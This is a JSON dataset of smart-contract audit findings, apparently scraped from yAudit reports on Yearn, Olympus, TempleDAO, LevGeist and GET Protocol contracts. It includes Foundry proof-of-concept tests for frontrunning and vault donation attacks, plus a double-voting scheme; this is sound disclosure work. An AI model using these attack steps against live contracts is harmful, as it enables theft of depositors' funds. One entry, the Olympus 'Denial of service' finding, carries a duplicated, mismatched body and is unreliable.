            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "37. Use uint256 for bool values",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "On the EVM, changing a state variable from 0 to non-zero uses Gsset and incurs 20,000 gas. In case of bools, every time a bool is changed from false ( value of 0), to true, Gsset cost of 20,000 is incurred.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "38. Unnecessary declaration for Abi Coder pragma",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "Abi Coder v2 is enabled by default since Solidity 0.8.0, hence it is not necessary to explicitly enable it.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "39. Constant is not named in capital letters",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "The official Solidity style guide recommends using all capital letters for contants. However, the constant max does not adhere to this guideline.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "40. Anyone can send ETH to the contract via the receive() function",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "The receive() function allows the Strategy contract to receive ETH from the WETH contract when the want token is WETH. However, anyone can send ETH to the contract via the receive() function as the address that sends the ETH isn't checked.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "41. Possible precision loss via the _ldToLp function",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "In the _ldToLp function the value returned is calculated by first dividing and then multiplying. This could lead to precision loss when liquidityPool.convertRate() != 1. If the convertRate() changes, the _ldToLp function will return lower value than expected.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. staking.unstake() should set rebasing bool to true",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md",
        "body": "The steps that the YieldStreamer functions take to withdraw yield to stream tokens occur in this order Calculate yield in gOHM Unwrap gOHM to sOHM Unstake sOHM to OHM Convert OHM to stream token The problem is in step 3. The rebasing bool is set to false, which will cause the staking contract to take gOHM from msg.sender instead of taking sOHM as the YieldStreamer contract requires. The logic for the rebasing boolean in the staking contract is if (_rebasing) { sOHM.safeTransferFrom(msg.sender, address(this), _amount); amount_ = amount_.add(bounty); } else { gOHM.burn(msg.sender, _amount); // amount was given in gOHM terms amount_ = gOHM.balanceFrom(amount_).add(bounty); // convert amount to OHM terms & add bounty } In order to convert sOHM to OHM in the staking.unstake() function, which is required in step 3 of the steps outlined above, the rebasing parameter must be set to true. Otherwise gOHM will be converted instead. https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/Staking.sol#L181 Currently the rebasing boolean value is set to false in two locations https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L246 https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L322",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Sandwich attack risk in YieldStreamer.sol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md",
        "body": "This code is how the swap is performed in YieldStreamer.sol in two locations: https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L248-L255 https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L324-L331 uint256[] memory calculatedAmounts = sushiRouter.getAmountsOut(totalOhmToSwap, sushiRouterPath); uint256[] memory amounts = sushiRouter.swapExactTokensForTokens( totalOhmToSwap, (calculatedAmounts[1] * (1000000 - maxSwapSlippagePercent)) / 1000000, sushiRouterPath, msg.sender, block.timestamp ); The amountOutMin value is the output of getAmountsOut(totalOhmToSwap, sushiRouterPath) minus some slippage percent maxSwapSlippagePercent. Examining the code of the swapExactTokensForTokens() function, we can see how amountOutMin is used. There is a check to confirm the result of the exchange is greater than the amountOutMin https://github.com/sushiswap/sushiswap/blob/56cedd0e06a6cf665083b3a662f9f77b80303ebe/contracts/uniswapv2/UniswapV2Router02.sol#L233 amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path); require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT'); But because the swapExactTokensForTokens() function is using the exact same getAmountsOut() function that was used in YieldStreamer.sol to calculate amountOutMin and is calculated in the same transaction, the result is that the two getAmountsOut() output values will always be equal. So the amountOutMin set in YieldStreamer.sol serves no purpose because it can never yield a result where the amountOutMin value reverts the swap, because amountOutMin is getAmountsOut() minus some slippage, which will always be less than or equal to getAmountsOut(). The current calculation to provide an amountOutMin value is a waste of gas. Even in a scenario where a private relay is used, miners cannot guarantee that a block will not become an uncle block. If the block is uncled, the mempool data becomes public and an uncle bandit attack is possible.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. Denial of service in upkeep \"for\" loop in YieldStreamer.sol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md",
        "body": "This code is how the swap is performed in YieldStreamer.sol in two locations: https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L248-L255 https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L324-L331 uint256[] memory calculatedAmounts = sushiRouter.getAmountsOut(totalOhmToSwap, sushiRouterPath); uint256[] memory amounts = sushiRouter.swapExactTokensForTokens( totalOhmToSwap, (calculatedAmounts[1] * (1000000 - maxSwapSlippagePercent)) / 1000000, sushiRouterPath, msg.sender, block.timestamp ); The amountOutMin value is the output of getAmountsOut(totalOhmToSwap, sushiRouterPath) minus some slippage percent maxSwapSlippagePercent. Examining the code of the swapExactTokensForTokens() function, we can see how amountOutMin is used. There is a check to confirm the result of the exchange is greater than the amountOutMin https://github.com/sushiswap/sushiswap/blob/56cedd0e06a6cf665083b3a662f9f77b80303ebe/contracts/uniswapv2/UniswapV2Router02.sol#L233 amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path); require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT'); But because the swapExactTokensForTokens() function is using the exact same getAmountsOut() function that was used in YieldStreamer.sol to calculate amountOutMin and is calculated in the same transaction, the result is that the two getAmountsOut() output values will always be equal. So the amountOutMin set in YieldStreamer.sol serves no purpose because it can never yield a result where the amountOutMin value reverts the swap, because amountOutMin is getAmountsOut() minus some slippage, which will always be less than or equal to getAmountsOut(). The current calculation to provide an amountOutMin value is a waste of gas. Even in a scenario where a private relay is used, miners cannot guarantee that a block will not become an uncle block. If the block is uncled, the mempool data becomes public and an uncle bandit attack is possible.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. donatedTo and depositsTo only return the first of N possible donation or deposit mappings",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md",
        "body": "https://github.com/OlympusDAO/olympus-contracts/blob/main/contracts/peripheral/YieldDirector.sol#L195 https://github.com/OlympusDAO/olympus-contracts/blob/main/contracts/peripheral/YieldDirector.sol#L256",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. _redeemAll() does not delete recipientLookup",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md",
        "body": "In the _redeem() function, receiptIds.pop(); and delete recipientLookup[depositId_] are called https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldDirector.sol#L429-L455 But in the similar _redeemAll() function, there is no delete recipientLookup[depositId_]; call. https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldDirector.sol#L460-L488",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Declare function external for gas savings",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md",
        "body": "https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldDirector.sol#L315",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Use == for gas savings",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md",
        "body": "<= is used instead of == in three modifiers https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldDirector.sol#L71-L81 >= can be simplified to < by flipping the if/else clauses in two locations https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldDirector.sol#L415 https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L163 An example of flipping the if/else clauses is shown. Here is the original code: if (amount_ >= _toAgnostic(depositInfo[depositId_].principalAmount)) { amountWithdrawn = _withdrawAllPrincipal(depositId_, msg.sender); } else { _withdrawPrincipal(depositId_, amount_, msg.sender); amountWithdrawn = amount_; } And here is the modified code with a minor gas savings. This specific gas savings may be negated if the _withdrawAllPrincipal clause is used most of the time: if (amount_ < _toAgnostic(depositInfo[depositId_].principalAmount)) { _withdrawPrincipal(depositId_, amount_, msg.sender); amountWithdrawn = amount_; } else { amountWithdrawn = _withdrawAllPrincipal(depositId_, msg.sender); }",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Simplify math for gas savings",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md",
        "body": "https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/types/YieldSplitter.sol#L129",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Use msg.sender for gas savings",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md",
        "body": "https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldDirector.sol#L404",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Remove functions to save gas on deployment",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md",
        "body": "balanceTo and balanceFrom in gOHM.sol convert between sOHM and gOHM using the current index exchange rate https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/governance/gOHM.sol#L111-L127 The YieldSplitter.sol functions _fromAgnostic and _toAgnostic duplicate this functionality https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/types/YieldSplitter.sol#L170-L186",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Gas savings using unchecked",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md",
        "body": "https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/types/YieldSplitter.sol#L167",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Gas savings with memory variable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md",
        "body": "The _closeDeposit() function in YieldSplitter.sol uses the value \"depositInfo[id_].depositor\" twice https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/types/YieldSplitter.sol#L144 The _redeemAll() in YieldDirector.sol function uses the value \"depositInfo[receiptIds[index - 1]].depositor\" twice https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldDirector.sol#L460",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. redeemAll repeatedly computes index - 1",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Miscellaneous Improvement Ideas",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md",
        "body": "Examples of overlap between YieldDirector.sol and YieldStreamer.sol include: YieldDirector.sol has modifiers isInvalidDeposit, isInvalidUpdate, and isInvalidWithdrawal, but YieldStreamer.sol only checks the boolean value depositDisabled, withdrawDisabled, or upkeepDisabled. YieldStreamer.sol may benefit from the same modifiers used in YieldDirector.sol. Functions like desposit() and addToDeposit() perform almost identical actions but have different names for input parameters and different natspec comments. These could be standardized better across the two contracts. Examples of magic numbers that should be converted to constant variables are found in several places: https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L436 https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L445 https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L251 https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L318 https://github.com/OlympusDAO/olympus-contracts/blob/f92425ff278b93cfc2a580299924417182da432a/contracts/peripheral/YieldStreamer.sol#L327",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. updateUserMinDaiThreshold assumes Dai is used as the streamToken",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md",
        "body": "https://github.com/OlympusDAO/olympus-contracts/blob/main/contracts/peripheral/YieldStreamer.sol#L280",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. Missing calls in scripts/deployAll.js",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Ohm.md",
        "body": "Start ganache and run npx hardhat run --network localhost scripts/deployAll.js . Observe the error message stating revert Timelock is disabled, use enable. To fix, add the line await olympusTreasury.initialize(); before the calls to olympusTreasury.queueTimelock() and observe the above hardhat work.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Incorrect transfer of funds on token exit",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-TempleDAO-Origami-Recheck.md",
        "body": "Calling exitToToken(ExitQuoteData calldata quoteData, address recipient) user can define address recipient to receive the funds but this address is ignored and all funds are sent to the message sender instead.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Avoid double checking",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-TempleDAO-Origami-Recheck.md",
        "body": "At L222 there is a check for condition reserveTokenAmount != 0, which already checked at L213.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. Incorrect comment",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-TempleDAO-Origami-Recheck.md",
        "body": "File MintableToken has a comment with an incorrect function accessibility.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Governable and GovernableUpgradeable should abstract common code into a common contract",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/02-2023-TempleDAO-Origami-Recheck.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Strategy.sol no slippage tolerance limit set on _sellRewardForWant",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-LevGeist.md",
        "body": "_claimAndSellRewards always passes 0 as the minOut argument to the _sellRewardForWant method, so there is no slippage tolerance limit.",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. BaseStrategy.sol Missing non-zero address check in setHealthCheck",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-LevGeist.md",
        "body": "The function does not have a non-zero address check for its address argument. All other setter methods for address type variables in the contract have non-zero address checks.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. liquidatePosition loss recording does not record loss when _amountNeeded.sub(_liquidatedAmount) <= minWant",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-LevGeist.md",
        "body": "Losses are only recorded when _amountNeeded.sub(_liquidatedAmount); <= minWant if (diff <= minWant) { _loss = diff; } Instead of _amountNeeded.sub(_liquidatedAmount) >= minWant",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Strategy.sol Missing non-zero address check in _initializeThis",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-LevGeist.md",
        "body": "The function calls an external contract to get some token addresses (address _aToken, , address _debtToken) = protocolDataProvider.getReserveTokensAddresses(address(want)); and then has a non-zero address check for _aToken, but not for _debtToken.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Strategy.sol Missing invariants checks in liquidatePosition",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-LevGeist.md",
        "body": "In the code we see the following comments: // NOTE: Maintain invariant `want.balanceOf(this) >= _liquidatedAmount` // NOTE: Maintain invariant `_liquidatedAmount + _loss <= _amountNeeded But they are just assumptions made by the developer and there are no assert/require statements to ensure they are really correct.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Strategy.sol unreachable code in prepareReturn",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-LevGeist.md",
        "body": "On lines 254 to 257, the if statement: if (amountRequired.sub(_debtPayment) < _profit) does not evaluate, this is because amountRequired is debtOutstanding + _profit and _debtPayment is debtOutstanding, meaning that the if statement always evaluates to _profit < _profit which is never true, meaning that line 256 never evaluates.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Unnecessary liquidation procedures",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-LevGeist.md",
        "body": "On line 336 https://github.com/Yacademy-block-2/yearnV2-gen-lev-lending/blob/levgeist/contracts/Strategy.sol#L336 the function checks if the want balance is sufficient to cover the amountNeeded, this is set as wantBalance > _amountNeeded. If wantBalance is the same as _amountNeeded the strategy still has sufficient funds to cover the withdraw, meaning the logic that follows this if statement is unnecessary.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Strategy.sol & BaseStrategy.sol inefficient usage of for loops",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-LevGeist.md",
        "body": "Strategy.sol lines 199, 455, 509 and BaseStrategy.sol line 893 contain for loops that are implemented inefficiently in terms of gas for the EVM. Omitting assigning a default-zero type variable to zero, caching array's length, using ++i instead of i++ can save a good chunk of gas, especially if the loop is long running.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Regular math can be used instead of SafeMath when it is safe",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-LevGeist.md",
        "body": "if (totalDebt > totalAssets) { // we have losses _loss = totalDebt.sub(totalAssets); } else { // we have profit _profit = totalAssets.sub(totalDebt); }",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. BaseStrategy.sol does not emit event in setHealthCheck",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-LevGeist.md",
        "body": "All other setter methods for address type variables in the contract emit events on state change, example: function setStrategist(address _strategist) external onlyAuthorized { require(_strategist != address(0)); strategist = _strategist; emit UpdatedStrategist(_strategist); }",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Strategy.sol does not emit event in setCollateralTargets, setMinsAndMaxs, setRewardBehavior",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-LevGeist.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Strategy.sol has rewards local variable defined in a couple of places which shadows reward state variable as defined in BaseStrategy.sol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-LevGeist.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Strategy.sol uses now keyword in _sellRewardForWant",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-LevGeist.md",
        "body": "The code makes use of the now keyword in Solidity which is deprecated in future Solidity versions.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Strategy.sol estimatedTotalAssets can be declared as external",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-LevGeist.md",
        "body": "The estimatedTotalAssets method is declared as public which should be used for method that will be called from inside of the contract, but estimatedTotalAssets isn't.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Centralised control of LP tokens on Spookyswap",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2022-LevGeist.md",
        "body": "As of 24/06/2022 84.6% of all Geist/FTM LP tokens are controlled by a single address as seen here: https://ftmscan.com/token/0x668ae94d0870230ac007a01b471d02b2c94ddcb9#balances this address is a MasterChef so does decentralise the system slightly, however if for whatever reason this liquidity was pulled it could result in extremely high slippage which reduces profitability of the strategy and exacerbates the chances of a sandwich attack.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Double voting using cross-chain voting",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "The process a staker would take to double vote with their assets is: Vote on the first chain (can be Ethereum mainnet or Polygon) Take the 15% instant withdrawal fee Bridge assets Restake GET to receive xGET Vote again on the second chain The end result is 85% more votes than should be possible from the original asset value There is even more complexity involved in cross-chain voting. Some other cases to consider are: The argument could be made that no user would want to lose 15% of their assets to get extra votes. This would depend on the bribe market and other factors, but there is also a way for the user to recapture some of their \"lost\" 15%. If a user has X amount of assets staked in the vault, 10% of the total amount could be used for this cross-chain double voting while the other 90% of the assets reclaim some of the \"lost\" 15% because the 15% fee is distributed among the stakers in the vault. To take this to the next level, a user who knows they will be performing an instant withdrawal can borrow GET at a certain interest rate, stake it, take the 15% instant withdrawal fee hit, and later withdraw the borrowed GET potentially at a profit before returning it to the borrower. Some modeling or linear programming is necessary to determine exactly when recapturing the 15% fee is profitable, especially in the scenario involving borrowed GET, which will not be examined further here. If a snapshot of user assets at a specific block is used to determine votes held by each address, the question is how to synchronize this point in time across chains. It is unlikely such a process would be exact, given that mining a block is not an instant process. If there is a different in snapshot times between Ethereum mainnet and Polygon, it may enable time for assets to be bridged across chains to enable this double voting. The exact plans around how this would work were not outlined in the smart contract and are not in scope of this review, but should be considered.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Withdraw and cancel requests can be frontrun for profit",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "In the following test example, Alice deposits funds, profits are scheduled, and Alice makes a withdrawal request while funds are being streamed. Right before the executeWithdrawalRequest() is triggered by Alice, Bob deposits funds, and he will be able to get the profits immediately. Because Alice executeWithdrawalRequest() is triggered right after the deposit, the leftover profits from the duration of the lockTime are distributed to everyone, including Bob, immediately through the burn of shares. In the test, we compare the shares with Eve's shares. Eve deposited right after Alice's withdrawal. They are very different from the amount of Bob shares's. The share amount is very different because the price per share has dramatically increased. function testFrontRunWithdraw() public { address eve = address(0x0E5E); // first Alice deposit _setUpDepositor(alice, 1 ether); // We add some profit asset.mint(address(vault), 1 ether); vault.updateVestingSchedule(); vm.warp(block.timestamp + 2 days); // Alice starts a withdrawal request vault.createWithdrawalRequest(1 ether); // we increase time to reach the end of the lock vm.warp(block.timestamp + 26 weeks); // Bob deposit _setUpDepositor(bob, 1 ether); vm.stopPrank(); // Alice execute the withdraw vm.startPrank(alice); vault.executeWithdrawalRequest(0); // Eve deposit vm.stopPrank(); _setUpDepositor(eve, 1 ether); vm.stopPrank(); assertApproxEqRel(vault.balanceOf(eve), vault.balanceOf(bob), 10e6); } function convertToAssets(uint256 shares_) public view virtual override returns (uint256 assets_) { uint256 supply = totalSupply; // Cache to stack. assets_ = supply == 0 ? shares_ : (shares_ * totalAssets()) / supply; }",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. Vault may be susceptible to donation attack",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "The first user to call deposit() on the GovernanceLockedRevenueDistributionToken.sol contract is issued the same quantity of shares as the underlying assets they provide. A user can abuse this to deposit a single quantity of assets in return for one share, setting the supply to 1. This same user could then send a large donation of underlying assets to the vault through a direct transfer and call the updateVestingSchedule() function to begin increasing the totalAssets() value. The ability to call updateVestingSchedule() after a donation is a requisite for this attack due to the totalAssets() value relying on the issuanceRate. The required capital for a successful donation attack will diminish over the course of a 14 day period. The below POC can be added to Compound.t.sol to show the donation amount needed to round another depositor's share issuance to 0 after 1 day has passed between deposits: function testDonationAttack() public { // after set up, allow alice to withdraw all but a dust amount from the vault // we warp ahead in time to avoid withdrawal penalties to ensure the vault is left with only dust vm.startPrank(alice); uint256 allButDust = 1 ether - 1; vault.createWithdrawalRequest((allButDust)); uint256 afterWithdrawalPenalties = start + 26 weeks; vm.warp(afterWithdrawalPenalties); // execute the withdrawal request vault.executeWithdrawalRequest(0); vm.stopPrank(); // print out the shares that would be minted from 1 ether console.log(\"1 ether deposit before donation attack yields _%s_ shares.\", vault.previewDeposit(1 ether)); // provide bob with starting capital asset.mint(bob, 14 ether + 1); // bob performs the donation. With a 1 day wait, it will require 14 times the capital of the other user to issue 0 shares // this is because the vesting schedule follows a linear issuance mechanism over the course of 14 days vm.startPrank(bob); asset.transfer(address(vault), 14 ether + 1); // call the update vesting schedule and wait 1 day for issuance rate to increase vault.updateVestingSchedule(); vm.warp(afterWithdrawalPenalties + (1 days)); // demonstrate that a user who wishes to deposit 1 ether will now be minted 0 shares console.log(\"1 ether deposit after donation attack yields _%s_ shares.\", vault.previewDeposit(1 ether)); }",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Redistribute event emits incorrect value and could underflow",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
        "body": "Within the executeWithdrawalRequest() function, a user's withdrawal request is processed, shares are transferred from the vault to the user, and the equivalent number of the user's shares are burned. When this internal _burn() function is called, the issuanceRate, totalAssets(), and supply values change. The Redistribute event is then emitted and the value it calculates in its convertToAssets() call is significantly impacted by these changes. Adding the following POC to InstantWithdrawal.t.sol demonstrates that the skewed value can even prevent the last share(s) from being withdrawn from the vault due to an arithmetic underflow: function testExecuteWithdrawalRedistributeUnderflow() public { // Alice deposits 1 ether of underlying asset to the vault // Bob deposits 2 ether of underlying asset to the vault _setUpDepositor(alice, 1 ether); _setUpDepositor(bob, 2 ether); // Allow bob to redeem early as seen in the instantWithdrawalFeeSharing test // This leaves positive yield in the vault for alice vault.redeem(vault.balanceOf(bob), bob, bob); uint256 bobFee_ = _instantWithdrawalFee(2 ether); // == 0.3 ether assertEq(asset.balanceOf(bob), 2 ether - bobFee_); vm.stopPrank(); // Attempt to withdraw our balance as alice // This will throw an arithmetic underflow due to the incorrect calculation in // The Redistribute event vm.startPrank(alice); vault.createWithdrawalRequest(vault.balanceOf(alice)); vault.executeWithdrawalRequest(0); vm.stopPrank(); }",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Incorrect _burn function in cancelWithdrawalRequest()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/12-2022-GET-Protocol-Staking.md",
